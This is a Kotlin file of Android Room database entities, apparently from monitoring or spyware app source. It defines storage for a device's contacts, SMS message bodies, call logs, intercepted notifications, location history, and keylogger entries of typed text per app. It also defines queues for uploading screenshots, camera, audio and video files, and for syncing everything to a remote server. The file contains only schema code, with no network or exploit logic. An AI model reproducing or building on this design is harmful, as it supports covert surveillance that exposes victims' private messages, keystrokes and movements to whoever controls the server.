package com.abuzahra.manager.database.entity

import androidx.room.*
import java.util.Date

/**
 * Contact Entity - Stores device contacts
 */
@Entity(tableName = "contacts", indices = [Index(value = ["phoneNumber"], unique = true)])
data class ContactEntity(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    val contactId: String,
    val name: String?,
    val phoneNumber: String,
    val email: String?,
    val photoUri: String?,
    val starred: Boolean = false,
    val timesContacted: Int = 0,
    val lastContacted: Long?,
    val createdAt: Long = System.currentTimeMillis(),
    val updatedAt: Long = System.currentTimeMillis(),
    val synced: Boolean = false
)

/**
 * SMS Entity - Stores SMS messages
 */
@Entity(tableName = "sms", indices = [Index(value = ["messageId"], unique = true)])
data class SmsEntity(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    val messageId: String,
    val address: String,
    val body: String,
    val date: Long,
    val dateSent: Long?,
    val type: Int, // 1=received, 2=sent, 3=draft, 4=outbox, 5=failed, 6=queued
    val read: Boolean = false,
    val status: Int = 0,
    val threadId: Long?,
    val person: String?,
    val createdAt: Long = System.currentTimeMillis(),
    val synced: Boolean = false
)

/**
 * Call Entity - Stores call log entries
 */
@Entity(tableName = "calls", indices = [Index(value = ["callId"], unique = true)])
data class CallEntity(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    val callId: String,
    val number: String,
    val date: Long,
    val duration: Long,
    val type: Int, // 1=incoming, 2=outgoing, 3=missed, 4=voicemail, 5=rejected, 6=blocked
    val name: String?,
    val cachedNumberType: Int?,
    val cachedNumberLabel: String?,
    val countryIso: String?,
    val voicemailUri: String?,
    val transcription: String?,
    val createdAt: Long = System.currentTimeMillis(),
    val synced: Boolean = false
)

/**
 * Notification Entity - Stores captured notifications
 */
@Entity(tableName = "notifications", indices = [Index(value = ["timestamp"])])
data class NotificationEntity(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    val packageName: String,
    val title: String?,
    val text: String?,
    val bigText: String?,
    val summaryText: String?,
    val subText: String?,
    val category: String?,
    val timestamp: Long,
    val postedTime: Long?,
    val ongoing: Boolean = false,
    val clearable: Boolean = true,
    val priority: Int = 0,
    val extras: String?, // JSON string
    val actions: String?, // JSON string
    val largeIcon: String?, // Base64
    val smallIcon: Int?,
    val createdAt: Long = System.currentTimeMillis(),
    val synced: Boolean = false
)

/**
 * App Entity - Stores installed app information
 */
@Entity(tableName = "installed_apps", indices = [Index(value = ["packageName"], unique = true)])
data class AppEntity(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    val packageName: String,
    val appName: String,
    val versionName: String?,
    val versionCode: Long,
    val installTime: Long,
    val updateTime: Long,
    val appSize: Long,
    val dataDir: String?,
    val sourceDir: String?,
    val isSystemApp: Boolean = false,
    val isUpdatedSystemApp: Boolean = false,
    val enabled: Boolean = true,
    val uid: Int,
    val targetSdkVersion: Int?,
    val permissions: String?, // JSON array
    val createdAt: Long = System.currentTimeMillis(),
    val updatedAt: Long = System.currentTimeMillis(),
    val synced: Boolean = false
)

/**
 * Device Event Entity - Logs device events
 */
@Entity(tableName = "device_events", indices = [Index(value = ["timestamp"])])
data class DeviceEventEntity(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    val eventType: String,
    val eventCategory: String,
    val eventData: String?, // JSON string
    val timestamp: Long,
    val deviceId: String?,
    val sessionId: String?,
    val severity: Int = 0, // 0=info, 1=warning, 2=error, 3=critical
    val acknowledged: Boolean = false,
    val createdAt: Long = System.currentTimeMillis()
)

/**
 * Location Entity - Stores location history
 */
@Entity(tableName = "locations", indices = [Index(value = ["timestamp"])])
data class LocationEntity(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    val latitude: Double,
    val longitude: Double,
    val accuracy: Float,
    val altitude: Double,
    val speed: Float,
    val bearing: Float,
    val provider: String,
    val timestamp: Long,
    val batteryLevel: Int?,
    val wifiSsid: String?,
    val mobileNetwork: String?,
    val activityType: String?, // still, walking, running, driving, etc.
    val createdAt: Long = System.currentTimeMillis(),
    val synced: Boolean = false
)

/**
 * Sync Queue Entity - Tracks pending sync items
 */
@Entity(tableName = "sync_queue", indices = [Index(value = ["syncType", "priority"])])
data class SyncQueueEntity(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    val syncType: String, // contacts, sms, calls, notifications, location, file, etc.
    val dataId: String, // ID of the data to sync
    val dataPayload: String?, // JSON or file path
    val priority: Int = 0,
    val retryCount: Int = 0,
    val maxRetries: Int = 5,
    val lastAttempt: Long?,
    val nextAttempt: Long,
    val status: String = "pending", // pending, in_progress, failed, completed
    val error: String?,
    val createdAt: Long = System.currentTimeMillis(),
    val updatedAt: Long = System.currentTimeMillis()
)

/**
 * Keylog Entity - Stores keylogger entries
 */
@Entity(tableName = "keylog", indices = [Index(value = ["timestamp"])])
data class KeylogEntity(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    val packageName: String,
    val text: String,
    val viewType: String,
    val viewId: String?,
    val timestamp: Long,
    val sessionId: String?,
    val createdAt: Long = System.currentTimeMillis(),
    val synced: Boolean = false
)

/**
 * File Entity - Tracks files for upload
 */
@Entity(tableName = "file_queue", indices = [Index(value = ["status"])])
data class FileQueueEntity(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    val filePath: String,
    val fileName: String,
    val fileType: String, // screenshot, camera, audio, video, document
    val fileSize: Long,
    val mimeType: String?,
    val md5Hash: String?,
    val uploadUrl: String?,
    val status: String = "pending", // pending, uploading, completed, failed
    val progress: Int = 0,
    val serverFileId: String?,
    val createdAt: Long = System.currentTimeMillis(),
    val uploadedAt: Long?,
    val synced: Boolean = false
)

/**
 * Backup Entity - Tracks backup history
 */
@Entity(tableName = "backups", indices = [Index(value = ["backupType", "createdAt"])])
data class BackupEntity(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    val backupType: String, // full, contacts, sms, calls, etc.
    val filePath: String,
    val fileName: String,
    val fileSize: Long,
    val itemCount: Int,
    val checksum: String?,
    val encrypted: Boolean = false,
    val uploaded: Boolean = false,
    val serverUrl: String?,
    val createdAt: Long = System.currentTimeMillis(),
    val expiresAt: Long?
)
